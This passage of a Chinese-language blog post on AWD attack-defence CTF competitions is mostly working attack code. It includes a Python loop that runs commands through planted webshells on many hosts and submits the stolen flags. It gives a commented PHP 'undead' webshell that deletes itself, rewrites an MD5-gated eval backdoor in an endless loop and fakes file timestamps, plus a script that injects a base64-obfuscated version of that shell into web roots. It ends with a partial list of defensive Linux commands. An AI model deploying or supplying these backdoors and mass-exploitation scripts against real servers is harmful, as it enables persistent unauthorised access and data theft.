    data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;url1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;readlines&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

paylaod2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;flag&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
header2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&#34;token string&#34;&gt;&#34;token&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token string&#34;&gt;&#34;Cookie&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#平台 url&lt;/span&gt;
url2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        urlpro&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;http://&amp;#123;&amp;#125;/.a.php?c=system(&#39;cat /flag.txt&#39;);&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        res&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;urlpro&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;#print(urlpro)&lt;/span&gt;
        p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;re&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;compile&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;flag.*&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;join&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;findall&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        paylaod2&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;flag&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a
        &lt;span class=&#34;token comment&#34;&gt;# print(paylaod2)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;# post 请求&lt;/span&gt;
        res2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; paylaod2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; headers&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;header2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;当然这样可能只能拿到一轮的分数，所以我们可以上传不死马，下面是一个常用的 MD5 不死马&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;ignore_user_abort&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 设置与客户机断开是否会终止脚本的执行，这里设置为 true 则忽略与用户的断开，即使与客户机断开脚本仍会执行。&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;set_time_limit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 设置脚本最大执行时间，这里设置为 0，即没有时间方面的限制&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 删除文件本身，以起到隐蔽自身的作用&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;.config.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;lt;?php if(md5($_GET[&#34;pass&#34;])==&#34;1a1dc91c907325c69271ddf0c944bc72&#34;)&amp;#123;@eval($_POST[xcu]);&amp;#125; ?&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;//pass=pass&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&#34;token function&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token function&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;touch -m -d &#34;2018-12-01 09:10:12&#34; .config2.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
		&lt;span class=&#34;token function&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;chmod 777 .config.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token function&#34;&gt;usleep&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//while 循环中每隔 usleep (0) 即写新的后门文件，system 命令用于修改文件的创建时间或修改时间，因为在 AWD 比赛中有的队伍使用&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time

&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; json

&lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;url.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;readlines&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;


nodie &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwokZmlsZT0iLmNvbmZpZzEucGhwIjsKJHNoZWxsPSJQRDl3YUhBZ0pHWmtlVUk5WTNKbFlYUmxYMloxYm1OMGFXOXVLSE4wY2w5eWIzUXhNeWduSkNjcExtSmhjMlUyTkY5a1pXTnZaR1VvSjJOM1BUMG5LUzV6ZEhKZmNtOTBNVE1vSjJJbktTNWphSElvTUhnMlpqaGxMekI0TVRBMktTNWlZWE5sTmpSZlpHVmpiMlJsS0NkYVVUMDlKeWtzWTJoeUtEQjRNVFpqWmpFdk1IZ3pPV1FwTG1Ob2NpZ3hNRFk1TURndk9UQTJLUzVpWVhObE5qUmZaR1ZqYjJSbEtDZFpVVDA5SnlrdVkyaHlLREF5TXpZMU1EQXZNREV6TmpBcExuTjBjbDl5YjNReE15Z25LQ2NwTG1Ob2NpZ3dNVEEwTnkwd01UQXdNeWt1YzNSeVgzSnZkREV6S0NkbUp5a3VjM1J5WDNKdmRERXpLQ2RpSnlrdVltRnpaVFkwWDJSbFkyOWtaU2duWWxFOVBTY3BMbUpoYzJVMk5GOWtaV052WkdVb0oxcFJQVDBuS1M1aVlYTmxOalJmWkdWamIyUmxLQ2RMVVQwOUp5a3VjM1J5WDNKdmRERXpLQ2M3SnlrcE95Um1aSGxDS0dKaGMyVTJORjlrWldOdlpHVW9KMDFVVFRKTkp5NG5lbU4zVHpBbkxpZENiR1JyUmljdUozTkxRMUptSnk0bkp5NWphSElvTURFek5USXRNREV5TWpVcExtTm9jaWcyT0RNeE1DODVPVEFwTG1Ob2NpZ3dlR05qT1dZdk1IZ3pPVGNwTG1KaGMyVTJORjlrWldOdlpHVW9KMVpCUFQwbktTNXpkSEpmY205ME1UTW9KMGtuS1M0bkp5NG5KeTVqYUhJb09EQTNMVGN6TnlrdWMzUnlYM0p2ZERFektDZG5KeWt1WTJoeUtEVXdOVFEwTHprM01pa3VZMmh5S0RCNE16Rm1MVEI0TW1NMktTNWphSElvTURjME5EUXdMekF4TVRRd0tTNG5KeTRuVm1STFZITW5MaWN3VFVScmVDY3VKMDFVUVRjbkxpY25LU2s3UHo0PSI7CndoaWxlKDEpCntmaWxlX3B1dF9jb250ZW50cygkZmlsZSxiYXNlNjRfZGVjb2RlKCRzaGVsbCkpOwogICAgc3lzdGVtKCdjaG1vZCA3NzcgLmNvbmZpZy5waHAnKTsKICAgIHRvdWNoKCIuY29uZmlnLnBocCIpOwogICAgdXNsZWVwKDUwKTt9Owo=&#34;&lt;/span&gt;
poc &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;fputs(fopen(&#39;/var/www/html/nodie.php&#39;,&#39;w&#39;),base64_decode(&#39;PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwokZmlsZT0iLmNvbmZpZzEucGhwIjsKJHNoZWxsPSJQRDl3YUhBZ0pHWmtlVUk5WTNKbFlYUmxYMloxYm1OMGFXOXVLSE4wY2w5eWIzUXhNeWduSkNjcExtSmhjMlUyTkY5a1pXTnZaR1VvSjJOM1BUMG5LUzV6ZEhKZmNtOTBNVE1vSjJJbktTNWphSElvTUhnMlpqaGxMekI0TVRBMktTNWlZWE5sTmpSZlpHVmpiMlJsS0NkYVVUMDlKeWtzWTJoeUtEQjRNVFpqWmpFdk1IZ3pPV1FwTG1Ob2NpZ3hNRFk1TURndk9UQTJLUzVpWVhObE5qUmZaR1ZqYjJSbEtDZFpVVDA5SnlrdVkyaHlLREF5TXpZMU1EQXZNREV6TmpBcExuTjBjbDl5YjNReE15Z25LQ2NwTG1Ob2NpZ3dNVEEwTnkwd01UQXdNeWt1YzNSeVgzSnZkREV6S0NkbUp5a3VjM1J5WDNKdmRERXpLQ2RpSnlrdVltRnpaVFkwWDJSbFkyOWtaU2duWWxFOVBTY3BMbUpoYzJVMk5GOWtaV052WkdVb0oxcFJQVDBuS1M1aVlYTmxOalJmWkdWamIyUmxLQ2RMVVQwOUp5a3VjM1J5WDNKdmRERXpLQ2M3SnlrcE95Um1aSGxDS0dKaGMyVTJORjlrWldOdlpHVW9KMDFVVFRKTkp5NG5lbU4zVHpBbkxpZENiR1JyUmljdUozTkxRMUptSnk0bkp5NWphSElvTURFek5USXRNREV5TWpVcExtTm9jaWcyT0RNeE1DODVPVEFwTG1Ob2NpZ3dlR05qT1dZdk1IZ3pPVGNwTG1KaGMyVTJORjlrWldOdlpHVW9KMVpCUFQwbktTNXpkSEpmY205ME1UTW9KMGtuS1M0bkp5NG5KeTVqYUhJb09EQTNMVGN6TnlrdWMzUnlYM0p2ZERFektDZG5KeWt1WTJoeUtEVXdOVFEwTHprM01pa3VZMmh5S0RCNE16Rm1MVEI0TW1NMktTNWphSElvTURjME5EUXdMekF4TVRRd0tTNG5KeTRuVm1STFZITW5MaWN3VFVScmVDY3VKMDFVUVRjbkxpY25LU2s3UHo0PSI7CndoaWxlKDEpCntmaWxlX3B1dF9jb250ZW50cygkZmlsZSxiYXNlNjRfZGVjb2RlKCRzaGVsbCkpOwogICAgc3lzdGVtKCdjaG1vZCA3NzcgLmNvbmZpZy5waHAnKTsKICAgIHRvdWNoKCIuY29uZmlnLnBocCIpOwogICAgdXNsZWVwKDUwKTt9Owo=&#39;));&#34;&lt;/span&gt;

header2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;token&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;token string&#34;&gt;&#34;Cookie&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#提交 flag&lt;/span&gt;
url4&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;

payload2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;flag&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
payload3&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;xcu&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;system(&#39;cat /flag.txt&#39;);&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;#执行命令&lt;/span&gt;
        url1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://&amp;#123;&amp;#125;?a=&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;#print(url1)&lt;/span&gt;
        res1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        url2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://&amp;#123;&amp;#125;/nodie.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;#print(url2)&lt;/span&gt;
        res2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        url3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://&amp;#123;&amp;#125;/.config1.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;#print(url3)&lt;/span&gt;
        res3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url3&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; res3&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;compile&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;flag.*&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;join&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;findall&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;#print(a)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;# 将 a 存入 paylaod2 中&lt;/span&gt;
        paylaod2&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;flag&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a
        &lt;span class=&#34;token comment&#34;&gt;#time.sleep(1)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;# print(paylaod2)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;# post 请求&lt;/span&gt;
        res2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url4&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; paylaod2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; headers&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;header2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;防护常见命令&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;1 ssh &amp;lt;-p 端口&amp;gt; username@ip

2 scp 文件路径 username@ip:存放路径

3 cat &amp;#x2F;root&amp;#x2F;.bash_history

4 #显示最近登录的5个帐号

5 last -n 5|awk &amp;#39;&amp;#123;print $1&amp;#125;&amp;#39;

6 #显示&amp;#x2F;etc&amp;#x2F;passwd的账户

7 cat &amp;#x2F;etc&amp;#x2F;passwd|awk -F &amp;#39;:&amp;#39; &amp;#39;&amp;#123;print $1&amp;#125;&amp;#39;

8 #查看UID为0的帐号

